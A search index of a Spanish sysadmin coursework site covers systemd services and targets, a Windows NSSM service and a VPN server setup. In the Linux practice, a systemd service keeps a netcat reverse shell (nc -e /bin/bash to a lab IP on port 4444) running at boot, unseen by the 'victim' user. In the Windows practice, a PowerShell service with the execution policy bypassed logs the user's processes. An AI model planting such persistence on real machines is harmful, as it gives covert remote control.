{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Administraci\u00f3n de Sistemas Operativos \u00a1Bienvenido/a a mi p\u00e1gina de Administraci\u00f3n de Sistemas Operativos! Aqu\u00ed encontrar\u00e1s proyectos, recursos y documentaci\u00f3n relacionados con la gesti\u00f3n y administraci\u00f3n de sistemas operativos, tanto Linux como Windows. Este espacio est\u00e1 pensado para compartir conocimientos, experiencias y avances en los diferentes proyectos desarrollados en el \u00e1mbito de los sistemas operativos. Explora los contenidos, participa y aprovecha al m\u00e1ximo este repositorio de aprendizaje colaborativo.","title":"Home"},{"location":"#administracion-de-sistemas-operativos","text":"\u00a1Bienvenido/a a mi p\u00e1gina de Administraci\u00f3n de Sistemas Operativos! Aqu\u00ed encontrar\u00e1s proyectos, recursos y documentaci\u00f3n relacionados con la gesti\u00f3n y administraci\u00f3n de sistemas operativos, tanto Linux como Windows. Este espacio est\u00e1 pensado para compartir conocimientos, experiencias y avances en los diferentes proyectos desarrollados en el \u00e1mbito de los sistemas operativos. Explora los contenidos, participa y aprovecha al m\u00e1ximo este repositorio de aprendizaje colaborativo.","title":"Administraci\u00f3n de Sistemas Operativos"},{"location":"LICENSE/","text":"Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0) Este trabajo est\u00e1 licenciado bajo la Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0) . Resumen Esta licencia permite que otros compartan, copien y distribuyan tu trabajo, as\u00ed como adaptarlo o transformarlo, siempre que: Reconozcan la autor\u00eda original. No utilicen el trabajo con fines comerciales. Distribuyan las obras derivadas bajo la misma licencia. Texto legal completo Puedes consultar el texto completo de la licencia aqu\u00ed: https://creativecommons.org/licenses/by-nc-sa/3.0/es/legalcode Atribuci\u00f3n y condiciones Se debe dar cr\u00e9dito adecuado, proporcionar un enlace a esta licencia e indicar si se han realizado cambios. Cualquier obra derivada debe distribuirse con la misma licencia y no se pueden imponer restricciones adicionales. \u00a9 2025 Mireia Consarnau","title":"Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0)"},{"location":"LICENSE/#licencia-creative-commons-reconocimiento-no-comercial-compartir-igual-30-espana-cc-by-nc-sa-30","text":"Este trabajo est\u00e1 licenciado bajo la Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0) .","title":"Licencia Creative Commons Reconocimiento - No Comercial - Compartir Igual 3.0 Espa\u00f1a (CC BY-NC-SA 3.0)"},{"location":"LICENSE/#resumen","text":"Esta licencia permite que otros compartan, copien y distribuyan tu trabajo, as\u00ed como adaptarlo o transformarlo, siempre que: Reconozcan la autor\u00eda original. No utilicen el trabajo con fines comerciales. Distribuyan las obras derivadas bajo la misma licencia.","title":"Resumen"},{"location":"LICENSE/#texto-legal-completo","text":"Puedes consultar el texto completo de la licencia aqu\u00ed: https://creativecommons.org/licenses/by-nc-sa/3.0/es/legalcode","title":"Texto legal completo"},{"location":"LICENSE/#atribucion-y-condiciones","text":"Se debe dar cr\u00e9dito adecuado, proporcionar un enlace a esta licencia e indicar si se han realizado cambios. Cualquier obra derivada debe distribuirse con la misma licencia y no se pueden imponer restricciones adicionales. \u00a9 2025 Mireia Consarnau","title":"Atribuci\u00f3n y condiciones"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/","text":"Creaci\u00f3 d'entorns d'arrancada Esta pr\u00e1ctica trata sobre la creaci\u00f3n de servicios ( .service ) y targets ( .target ) en Ubuntu, conceptos fundamentales en la administraci\u00f3n de sistemas y ciberseguridad. Un archivo .service define un servicio gestionado por systemd , como ejecutar autom\u00e1ticamente un script al iniciar el equipo. Por ejemplo, se puede usar para levantar una reverse shell en un entorno de pruebas de ciberseguridad. Un archivo .target agrupa varios servicios y otros targets, permitiendo organizar y controlar el arranque de m\u00faltiples componentes relacionados. El directorio .wants se genera autom\u00e1ticamente por systemd para cada target y contiene enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. As\u00ed, al activar un target, se activan todos los servicios asociados en su .wants . En resumen: los .service definen tareas concretas, los .target agrupan servicios, y los .wants gestionan qu\u00e9 servicios se inician con cada target. .service El siguiente es un ejemplo de archivo .service : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del servicio y sus dependencias. Description=Servicio pt1 que ejecuta pt1.sh : Breve descripci\u00f3n del servicio. After=network.target : Indica que el servicio debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Service] : Secci\u00f3n principal que define c\u00f3mo se ejecuta el servicio. ExecStart=/usr/local/bin/pt1.sh : Comando que se ejecuta al iniciar el servicio (en este caso, el script pt1.sh ). Restart=always : El servicio se reiniciar\u00e1 autom\u00e1ticamente si se detiene por cualquier motivo. Type=simple : Indica que el servicio se considera activo mientras el proceso principal est\u00e9 en ejecuci\u00f3n. TimeoutStartSec=0 : No hay tiempo de espera para que el servicio arranque; se inicia inmediatamente. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el servicio. WantedBy=pt1.target : Permite que el servicio se active autom\u00e1ticamente cuando se inicia el target pt1.target . .target El siguiente es un ejemplo de archivo .target : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del target y sus dependencias. Description=Target personalizado pt1 : Breve descripci\u00f3n del target. Requires=pt1.service : Indica que este target necesita que el servicio pt1.service est\u00e9 activo. After=network.target : Especifica que este target debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el target. WantedBy=default.target : Permite que el target se active autom\u00e1ticamente al arrancar el sistema, ya que default.target es el objetivo principal de arranque en la mayor\u00eda de sistemas Linux. \u00bfPor qu\u00e9 se genera autom\u00e1ticamente un directorio .target.wants ? Cuando se instala un servicio con la opci\u00f3n WantedBy en su archivo .service , systemd crea autom\u00e1ticamente un directorio llamado .target.wants para el target especificado. Dentro de este directorio, se a\u00f1aden enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. Esto permite que, al activar el target, se ejecuten todos los servicios asociados de forma autom\u00e1tica y ordenada, facilitando la gesti\u00f3n de dependencias y el arranque de componentes relacionados. Se generar\u00e1 autom\u00e1ticamente m\u00e1s adelante, no hace falta crearlo. .script El siguiente es un ejemplo de archivo .sh : Voy a realizar una prueba ejecutando el script manualmente para comprobar si puedo conectarme correctamente al equipo remoto. Esto me permitir\u00e1 verificar que la configuraci\u00f3n y el funcionamiento del script son correctos antes de automatizar el proceso con systemd. Explicaci\u00f3n l\u00ednea por l\u00ednea: SERVER_IP=\"192.168.1.100\" : Define la IP del equipo remoto que recibir\u00e1 la conexi\u00f3n. PORT=4444 : Especifica el puerto en el que el equipo remoto est\u00e1 escuchando. while true; do ... done : Bucle infinito para intentar la conexi\u00f3n continuamente. nc.traditional $SERVER_IP $PORT -e /bin/bash : Usa Netcat para conectar al equipo remoto y ejecutar Bash, proporcionando una shell interactiva. sleep 10 : Si la conexi\u00f3n falla, espera 10 segundos antes de volver a intentarlo. Pasos para aplicar los cambios y activar los servicios autom\u00e1ticamente Recargar la configuraci\u00f3n de systemd: sudo systemctl daemon-reload Habilitar el servicio y el target para que se inicien autom\u00e1ticamente: sudo systemctl enable pt1.service sudo systemctl enable pt1.target Esto crea los enlaces simb\u00f3licos en los directorios .wants correspondientes. Iniciar manualmente el target (opcional, para comprobar que funciona): sudo systemctl start pt1.target Verificar el estado del servicio y del target: systemctl status pt1.service systemctl status pt1.target Con estos pasos, el servicio y el target estar\u00e1n configurados para arrancar autom\u00e1ticamente cada vez que se inicie el sistema. Demostraci\u00f3n en v\u00eddeo A continuaci\u00f3n se muestra un v\u00eddeo donde se reinicia la m\u00e1quina virtual y se verifica que la conexi\u00f3n al equipo remoto se establece autom\u00e1ticamente, gracias a la configuraci\u00f3n realizada con systemd. Este proceso ocurre de manera transparente para el usuario de la m\u00e1quina v\u00edctima, demostrando c\u00f3mo los servicios y targets permiten automatizar tareas en el arranque del sistema sin intervenci\u00f3n manual.","title":"Creaci\u00f3 entorn d\u2019arrencada Linux"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/#creacio-dentorns-darrancada","text":"Esta pr\u00e1ctica trata sobre la creaci\u00f3n de servicios ( .service ) y targets ( .target ) en Ubuntu, conceptos fundamentales en la administraci\u00f3n de sistemas y ciberseguridad. Un archivo .service define un servicio gestionado por systemd , como ejecutar autom\u00e1ticamente un script al iniciar el equipo. Por ejemplo, se puede usar para levantar una reverse shell en un entorno de pruebas de ciberseguridad. Un archivo .target agrupa varios servicios y otros targets, permitiendo organizar y controlar el arranque de m\u00faltiples componentes relacionados. El directorio .wants se genera autom\u00e1ticamente por systemd para cada target y contiene enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. As\u00ed, al activar un target, se activan todos los servicios asociados en su .wants . En resumen: los .service definen tareas concretas, los .target agrupan servicios, y los .wants gestionan qu\u00e9 servicios se inician con cada target.","title":"Creaci\u00f3 d'entorns d'arrancada"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/#service","text":"El siguiente es un ejemplo de archivo .service : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del servicio y sus dependencias. Description=Servicio pt1 que ejecuta pt1.sh : Breve descripci\u00f3n del servicio. After=network.target : Indica que el servicio debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Service] : Secci\u00f3n principal que define c\u00f3mo se ejecuta el servicio. ExecStart=/usr/local/bin/pt1.sh : Comando que se ejecuta al iniciar el servicio (en este caso, el script pt1.sh ). Restart=always : El servicio se reiniciar\u00e1 autom\u00e1ticamente si se detiene por cualquier motivo. Type=simple : Indica que el servicio se considera activo mientras el proceso principal est\u00e9 en ejecuci\u00f3n. TimeoutStartSec=0 : No hay tiempo de espera para que el servicio arranque; se inicia inmediatamente. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el servicio. WantedBy=pt1.target : Permite que el servicio se active autom\u00e1ticamente cuando se inicia el target pt1.target .","title":".service"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/#target","text":"El siguiente es un ejemplo de archivo .target : Explicaci\u00f3n l\u00ednea por l\u00ednea: [Unit] : Secci\u00f3n donde se describe el prop\u00f3sito del target y sus dependencias. Description=Target personalizado pt1 : Breve descripci\u00f3n del target. Requires=pt1.service : Indica que este target necesita que el servicio pt1.service est\u00e9 activo. After=network.target : Especifica que este target debe iniciarse despu\u00e9s de que la red est\u00e9 disponible. [Install] : Secci\u00f3n que define c\u00f3mo y cu\u00e1ndo se activa el target. WantedBy=default.target : Permite que el target se active autom\u00e1ticamente al arrancar el sistema, ya que default.target es el objetivo principal de arranque en la mayor\u00eda de sistemas Linux.","title":".target"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/#por-que-se-genera-automaticamente-un-directorio-targetwants","text":"Cuando se instala un servicio con la opci\u00f3n WantedBy en su archivo .service , systemd crea autom\u00e1ticamente un directorio llamado .target.wants para el target especificado. Dentro de este directorio, se a\u00f1aden enlaces simb\u00f3licos a los servicios que deben iniciarse junto con ese target. Esto permite que, al activar el target, se ejecuten todos los servicios asociados de forma autom\u00e1tica y ordenada, facilitando la gesti\u00f3n de dependencias y el arranque de componentes relacionados. Se generar\u00e1 autom\u00e1ticamente m\u00e1s adelante, no hace falta crearlo.","title":"\u00bfPor qu\u00e9 se genera autom\u00e1ticamente un directorio .target.wants?"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/#script","text":"El siguiente es un ejemplo de archivo .sh : Voy a realizar una prueba ejecutando el script manualmente para comprobar si puedo conectarme correctamente al equipo remoto. Esto me permitir\u00e1 verificar que la configuraci\u00f3n y el funcionamiento del script son correctos antes de automatizar el proceso con systemd. Explicaci\u00f3n l\u00ednea por l\u00ednea: SERVER_IP=\"192.168.1.100\" : Define la IP del equipo remoto que recibir\u00e1 la conexi\u00f3n. PORT=4444 : Especifica el puerto en el que el equipo remoto est\u00e1 escuchando. while true; do ... done : Bucle infinito para intentar la conexi\u00f3n continuamente. nc.traditional $SERVER_IP $PORT -e /bin/bash : Usa Netcat para conectar al equipo remoto y ejecutar Bash, proporcionando una shell interactiva. sleep 10 : Si la conexi\u00f3n falla, espera 10 segundos antes de volver a intentarlo.","title":".script"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/#pasos-para-aplicar-los-cambios-y-activar-los-servicios-automaticamente","text":"Recargar la configuraci\u00f3n de systemd: sudo systemctl daemon-reload Habilitar el servicio y el target para que se inicien autom\u00e1ticamente: sudo systemctl enable pt1.service sudo systemctl enable pt1.target Esto crea los enlaces simb\u00f3licos en los directorios .wants correspondientes. Iniciar manualmente el target (opcional, para comprobar que funciona): sudo systemctl start pt1.target Verificar el estado del servicio y del target: systemctl status pt1.service systemctl status pt1.target Con estos pasos, el servicio y el target estar\u00e1n configurados para arrancar autom\u00e1ticamente cada vez que se inicie el sistema.","title":"Pasos para aplicar los cambios y activar los servicios autom\u00e1ticamente"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaLinux/#demostracion-en-video","text":"A continuaci\u00f3n se muestra un v\u00eddeo donde se reinicia la m\u00e1quina virtual y se verifica que la conexi\u00f3n al equipo remoto se establece autom\u00e1ticamente, gracias a la configuraci\u00f3n realizada con systemd. Este proceso ocurre de manera transparente para el usuario de la m\u00e1quina v\u00edctima, demostrando c\u00f3mo los servicios y targets permiten automatizar tareas en el arranque del sistema sin intervenci\u00f3n manual.","title":"Demostraci\u00f3n en v\u00eddeo"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaWin/","text":"Creaci\u00f3n de un servicio en Windows En esta pr\u00e1ctica explico c\u00f3mo cre\u00e9 un servicio en Windows que ejecuta autom\u00e1ticamente un script de PowerShell usando NSSM (Non-Sucking Service Manager). Us\u00e9 NSSM para instalar un script como servicio y configurar el ejecutable, los argumentos, el directorio de inicio y la cuenta de ejecuci\u00f3n. Resumen: - Un servicio es un proceso en segundo plano que puede iniciarse autom\u00e1ticamente al arrancar el sistema. - NSSM me permite convertir scripts/aplicaciones en servicios gestionados por el sistema con opciones avanzadas de configuraci\u00f3n. Instalaci\u00f3n del servicio con NSSM Ejecuto NSSM desde PowerShell para instalar el servicio: C:\\Users\\dariel\\Desktop\\nssm-2.24\\nssm-2.24\\win64\\nssm.exe install pt2Servicio Se me abrir\u00e1 la interfaz gr\u00e1fica de NSSM. Configuro los campos principales: Campos y valores que utilic\u00e9: Path: system32\\WindowsPowerShell\\v1.0\\powershell.exe Indica que el servicio ejecutar\u00e1 PowerShell. Startup directory: C:\\Users\\dariel\\Desktop\\Servicios Carpeta donde est\u00e1 el script. Arguments: -ExecutionPolicy Bypass -File \"C:\\Users\\dariel\\Desktop\\Servicios\\pt2.ps1\" Permite ejecutar pt2.ps1 saltando la pol\u00edtica de ejecuci\u00f3n. Service name: pt2Servicio Nombre del servicio que cre\u00e9. Al pulsar \"Install service\", obtengo la confirmaci\u00f3n de instalaci\u00f3n: Configuraci\u00f3n del servicio en Windows Puedo ver el servicio en la lista de servicios del sistema: Desde la consola de servicios puedo: - Iniciar, detener o reiniciar el servicio. - Configurar tipo de inicio: Autom\u00e1tico, Manual o Deshabilitado. - Ajustar propiedades como la cuenta bajo la cual se ejecuta. En la pesta\u00f1a \"Iniciar sesi\u00f3n\" selecciono una cuenta con los privilegios necesarios: Inicio del servicio y verificaci\u00f3n Inicio el servicio desde PowerShell: net start pt2Servicio En la consola de servicios veo el servicio en estado \"En ejecuci\u00f3n\": Script asociado (pt2.ps1) A continuaci\u00f3n el script real utilizado y una breve explicaci\u00f3n. # Mostrar notificaci\u00f3n personalizada Add-Type -AssemblyName System.Windows.Forms [System.Windows.Forms.MessageBox]::Show(\"\u00a1Bienvenido! El sistema se ha iniciado correctamente.\", \"Servicio Activo\") # Ruta del log $logPath = \"C:\\Users\\dariel\\Desktop\\Servicios\\pt2.log\" # Recopilar informaci\u00f3n del sistema $usuario = $env:USERNAME $equipo = $env:COMPUTERNAME $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias \"Ethernet\" | Where-Object {$_.IPAddress -ne \"127.0.0.1\"}).IPAddress $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2) $inicio = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime # Guardar informaci\u00f3n inicial Add-Content -Path $logPath -Value \"`n--- Inicio de sesi\u00f3n ---\" Add-Content -Path $logPath -Value \"Usuario: $usuario\" Add-Content -Path $logPath -Value \"Equipo: $equipo\" Add-Content -Path $logPath -Value \"IP: $ip\" Add-Content -Path $logPath -Value \"RAM: $ram GB\" Add-Content -Path $logPath -Value \"Inicio del sistema: $inicio\" Add-Content -Path $logPath -Value \"-------------------------`n\" # Monitorizar procesos abiertos por el usuario $procesosPrevios = @() while ($true) { $procesosActuales = Get-Process | Select-Object -ExpandProperty ProcessName $nuevos = $procesosActuales | Where-Object { $_ -notin $procesosPrevios } foreach ($proceso in $nuevos) { $hora = Get-Date -Format \"HH:mm:ss\" Add-Content -Path $logPath -Value \"$hora - Aplicaci\u00f3n iniciada: $proceso\" } $procesosPrevios = $procesosActuales Start-Sleep -Seconds 5 } Explicaci\u00f3n: Muestra una notificaci\u00f3n inicial mediante System.Windows.Forms. Registra en un fichero de log informaci\u00f3n del sistema (usuario, equipo, IP, RAM y hora de arranque). Monitoriza procesos y a\u00f1ade al log las aplicaciones que aparecen nuevas, comprobando cada 5 segundos. Nota: al ejecutarlo como servicio hay que asegurar permisos y rutas; la notificaci\u00f3n gr\u00e1fica puede no mostrarse si el servicio no interact\u00faa con el escritorio (sesi\u00f3n 0). Pasos finales para automatizar el arranque Configuro el servicio con inicio autom\u00e1tico. Reinicio el sistema y verifico que el servicio se inicia correctamente. Compruebo permisos y dependencias (cuenta de servicio, rutas accesibles, variables de entorno) para evitar errores durante el arranque.","title":"Creaci\u00f3 entorn d\u2019arrencada Windows"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaWin/#creacion-de-un-servicio-en-windows","text":"En esta pr\u00e1ctica explico c\u00f3mo cre\u00e9 un servicio en Windows que ejecuta autom\u00e1ticamente un script de PowerShell usando NSSM (Non-Sucking Service Manager). Us\u00e9 NSSM para instalar un script como servicio y configurar el ejecutable, los argumentos, el directorio de inicio y la cuenta de ejecuci\u00f3n. Resumen: - Un servicio es un proceso en segundo plano que puede iniciarse autom\u00e1ticamente al arrancar el sistema. - NSSM me permite convertir scripts/aplicaciones en servicios gestionados por el sistema con opciones avanzadas de configuraci\u00f3n.","title":"Creaci\u00f3n de un servicio en Windows"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaWin/#instalacion-del-servicio-con-nssm","text":"Ejecuto NSSM desde PowerShell para instalar el servicio: C:\\Users\\dariel\\Desktop\\nssm-2.24\\nssm-2.24\\win64\\nssm.exe install pt2Servicio Se me abrir\u00e1 la interfaz gr\u00e1fica de NSSM. Configuro los campos principales: Campos y valores que utilic\u00e9: Path: system32\\WindowsPowerShell\\v1.0\\powershell.exe Indica que el servicio ejecutar\u00e1 PowerShell. Startup directory: C:\\Users\\dariel\\Desktop\\Servicios Carpeta donde est\u00e1 el script. Arguments: -ExecutionPolicy Bypass -File \"C:\\Users\\dariel\\Desktop\\Servicios\\pt2.ps1\" Permite ejecutar pt2.ps1 saltando la pol\u00edtica de ejecuci\u00f3n. Service name: pt2Servicio Nombre del servicio que cre\u00e9. Al pulsar \"Install service\", obtengo la confirmaci\u00f3n de instalaci\u00f3n:","title":"Instalaci\u00f3n del servicio con NSSM"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaWin/#configuracion-del-servicio-en-windows","text":"Puedo ver el servicio en la lista de servicios del sistema: Desde la consola de servicios puedo: - Iniciar, detener o reiniciar el servicio. - Configurar tipo de inicio: Autom\u00e1tico, Manual o Deshabilitado. - Ajustar propiedades como la cuenta bajo la cual se ejecuta. En la pesta\u00f1a \"Iniciar sesi\u00f3n\" selecciono una cuenta con los privilegios necesarios:","title":"Configuraci\u00f3n del servicio en Windows"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaWin/#inicio-del-servicio-y-verificacion","text":"Inicio el servicio desde PowerShell: net start pt2Servicio En la consola de servicios veo el servicio en estado \"En ejecuci\u00f3n\":","title":"Inicio del servicio y verificaci\u00f3n"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaWin/#script-asociado-pt2ps1","text":"A continuaci\u00f3n el script real utilizado y una breve explicaci\u00f3n. # Mostrar notificaci\u00f3n personalizada Add-Type -AssemblyName System.Windows.Forms [System.Windows.Forms.MessageBox]::Show(\"\u00a1Bienvenido! El sistema se ha iniciado correctamente.\", \"Servicio Activo\") # Ruta del log $logPath = \"C:\\Users\\dariel\\Desktop\\Servicios\\pt2.log\" # Recopilar informaci\u00f3n del sistema $usuario = $env:USERNAME $equipo = $env:COMPUTERNAME $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias \"Ethernet\" | Where-Object {$_.IPAddress -ne \"127.0.0.1\"}).IPAddress $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2) $inicio = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime # Guardar informaci\u00f3n inicial Add-Content -Path $logPath -Value \"`n--- Inicio de sesi\u00f3n ---\" Add-Content -Path $logPath -Value \"Usuario: $usuario\" Add-Content -Path $logPath -Value \"Equipo: $equipo\" Add-Content -Path $logPath -Value \"IP: $ip\" Add-Content -Path $logPath -Value \"RAM: $ram GB\" Add-Content -Path $logPath -Value \"Inicio del sistema: $inicio\" Add-Content -Path $logPath -Value \"-------------------------`n\" # Monitorizar procesos abiertos por el usuario $procesosPrevios = @() while ($true) { $procesosActuales = Get-Process | Select-Object -ExpandProperty ProcessName $nuevos = $procesosActuales | Where-Object { $_ -notin $procesosPrevios } foreach ($proceso in $nuevos) { $hora = Get-Date -Format \"HH:mm:ss\" Add-Content -Path $logPath -Value \"$hora - Aplicaci\u00f3n iniciada: $proceso\" } $procesosPrevios = $procesosActuales Start-Sleep -Seconds 5 } Explicaci\u00f3n: Muestra una notificaci\u00f3n inicial mediante System.Windows.Forms. Registra en un fichero de log informaci\u00f3n del sistema (usuario, equipo, IP, RAM y hora de arranque). Monitoriza procesos y a\u00f1ade al log las aplicaciones que aparecen nuevas, comprobando cada 5 segundos. Nota: al ejecutarlo como servicio hay que asegurar permisos y rutas; la notificaci\u00f3n gr\u00e1fica puede no mostrarse si el servicio no interact\u00faa con el escritorio (sesi\u00f3n 0).","title":"Script asociado (pt2.ps1)"},{"location":"Creaci%C3%B3%20entorn%20d%E2%80%99arrencada/CreacioEntornsArrancadaWin/#pasos-finales-para-automatizar-el-arranque","text":"Configuro el servicio con inicio autom\u00e1tico. Reinicio el sistema y verifico que el servicio se inicia correctamente. Compruebo permisos y dependencias (cuenta de servicio, rutas accesibles, variables de entorno) para evitar errores durante el arranque.","title":"Pasos finales para automatizar el arranque"},{"location":"VPN/vpn/","text":"Servidor VPN Instalaci\u00f3n de Caracter\u00edsticas Para poder levantar un servidor VPN es necesario agregar el rol Acceso remoto desde el asistente de Windows Server. Dentro de este rol se incluyen los servicios DirectAccess y VPN (RAS) junto con el componente de Enrutamiento, ambos necesarios para permitir conexiones remotas y gestionar el tr\u00e1fico del t\u00fanel VPN. Configuraci\u00f3n del Servidor Una vez instalado el rol correspondiente, se accede a la consola de administraci\u00f3n desde el men\u00fa Herramientas del Administrador del servidor. Dentro de este men\u00fa se debe seleccionar la opci\u00f3n Enrutamiento y acceso remoto, que permitir\u00e1 iniciar la configuraci\u00f3n del servicio VPN y habilitar las funciones necesarias para gestionar conexiones remotas. Para continuar con la configuraci\u00f3n, se selecciona el servidor dentro de la consola y se utiliza la opci\u00f3n Configurar y habilitar Enrutamiento y acceso remoto. Esto inicia el asistente que permitir\u00e1 activar los servicios necesarios para que el servidor funcione como punto de acceso VPN y gestione las conexiones entrantes. Para continuar con el asistente, se selecciona la opci\u00f3n Acceso remoto (acceso telef\u00f3nico o red privada virtual). Esta configuraci\u00f3n habilita al servidor para aceptar conexiones remotas mediante VPN, permitiendo que los clientes externos puedan autenticarse y establecer un t\u00fanel seguro hacia la red interna. En este paso se habilita espec\u00edficamente la opci\u00f3n VPN, indicando que el servidor actuar\u00e1 como puerta de enlace para recibir conexiones remotas a trav\u00e9s de Internet. Al seleccionar esta opci\u00f3n, el asistente prepara la configuraci\u00f3n necesaria para que los clientes puedan establecer un t\u00fanel seguro hacia la red interna del servidor. En este punto se selecciona la interfaz de red que el servidor utilizar\u00e1 para recibir las conexiones VPN. Se escoge la interfaz conectada hacia Internet o hacia la red externa, ya que ser\u00e1 la encargada de gestionar el tr\u00e1fico entrante de los clientes remotos. Esta selecci\u00f3n permite al asistente configurar las rutas y reglas necesarias para que el t\u00fanel VPN funcione correctamente. Para continuar con la configuraci\u00f3n, se selecciona la opci\u00f3n Autom\u00e1ticamente para la asignaci\u00f3n de direcciones IP. Con esta opci\u00f3n, el servidor utilizar\u00e1 el servicio DHCP existente para entregar direcciones a los clientes VPN; en caso de no haber un DHCP disponible, el propio servidor generar\u00e1 las direcciones de forma interna. Esto permite que los clientes remotos obtengan una IP v\u00e1lida dentro del rango configurado al establecer el t\u00fanel. En este paso se indica que la autenticaci\u00f3n de las solicitudes se gestionar\u00e1 directamente desde Enrutamiento y acceso remoto, por lo que se selecciona la opci\u00f3n No, usar Enrutamiento y acceso remoto para autenticar las solicitudes de conexi\u00f3n. Con esto, el propio servidor ser\u00e1 el encargado de validar las credenciales de los usuarios que intenten conectarse mediante VPN, sin necesidad de integrar un servidor RADIUS externo. Tras completar todas las fases del asistente, se muestra un resumen indicando la interfaz por la que los clientes VPN se conectar\u00e1n, as\u00ed como la red que se asignar\u00e1 para el direccionamiento interno. Con esta informaci\u00f3n confirmada, solo queda finalizar el asistente para que el servicio de Enrutamiento y acceso remoto quede habilitado y el servidor empiece a funcionar como servidor VPN. Configurar el rango de direcciones para los clientes del t\u00fanel VPN Para definir qu\u00e9 direcciones IP recibir\u00e1n los clientes que se conecten al t\u00fanel VPN, se accede a las propiedades del servidor dentro de Enrutamiento y acceso remoto. En la pesta\u00f1a IPv4, se selecciona la opci\u00f3n Conjunto de direcciones est\u00e1ticas y se utiliza el bot\u00f3n Agregar para establecer el rango que se asignar\u00e1 de forma exclusiva a los usuarios conectados mediante VPN. Para permitir que el usuario pueda autenticarse mediante VPN, se accede a sus propiedades y dentro de la pesta\u00f1a Marcado se habilita la opci\u00f3n Permitir acceso. Con este ajuste, el servidor autoriza expl\u00edcitamente a esta cuenta para establecer conexiones remotas a trav\u00e9s del servicio de Enrutamiento y acceso remoto, asegurando que solo usuarios aprobados puedan acceder al t\u00fanel VPN. Configuraci\u00f3n de la conexi\u00f3n VPN en el cliente En el equipo cliente se procede a crear la conexi\u00f3n VPN introduciendo la informaci\u00f3n necesaria: un nombre identificativo para la conexi\u00f3n, la direcci\u00f3n IP del servidor VPN y el protocolo a utilizar. Tambi\u00e9n se especifican las credenciales del usuario autorizado para establecer el t\u00fanel. Estos par\u00e1metros permiten que el cliente pueda autenticar correctamente la conexi\u00f3n y comunicarse con el servidor de forma segura. Una vez creada la conexi\u00f3n VPN en el cliente, esta aparece disponible en el panel de configuraci\u00f3n, permitiendo gestionarla directamente desde el sistema. En este punto se puede revisar su estado, acceder a las opciones avanzadas y preparar la conexi\u00f3n para su uso. Tras iniciar la conexi\u00f3n, el cliente establece correctamente el t\u00fanel con el servidor VPN y el estado cambia a Conectado. Desde esta misma ventana es posible mantener la sesi\u00f3n activa o desconectarla cuando sea necesario, verificando as\u00ed que la comunicaci\u00f3n con el servidor se realiza de forma correcta. Configuraci\u00f3n de la carpeta accesible \u00fanicamente por el usuario VPN Para proteger el recurso compartido y asegurar que \u00fanicamente el usuario conectado por VPN pueda acceder, se crea una carpeta dedicada y se configura como recurso compartido. Desde las propiedades de la carpeta se habilita el uso compartido y se asigna un nombre identificativo accesible a trav\u00e9s de la red. Este paso permite que la carpeta pueda ser alcanzada mediante el t\u00fanel VPN una vez que el usuario est\u00e9 autenticado. Para definir correctamente qui\u00e9n puede acceder al recurso compartido, se selecciona \u00fanicamente al usuario destinado para la VPN y se le asignan los permisos necesarios. En este caso, se agrega el usuario vpnuser y se establece su nivel de permiso en Lectura y escritura, garantizando que solo \u00e9l pueda interactuar con la carpeta cuando acceda a trav\u00e9s del t\u00fanel VPN. Los dem\u00e1s usuarios mantienen permisos restringidos o no tienen acceso, reforzando el control de seguridad del recurso. Para comprobar el acceso a la carpeta compartida desde el cliente conectado por VPN, se utiliza el comando Ejecutar introduciendo la ruta UNC del recurso. Al indicar \\WIN-S7UCV5BGJGB\\VPNShare, el sistema intenta acceder directamente a la carpeta a trav\u00e9s del 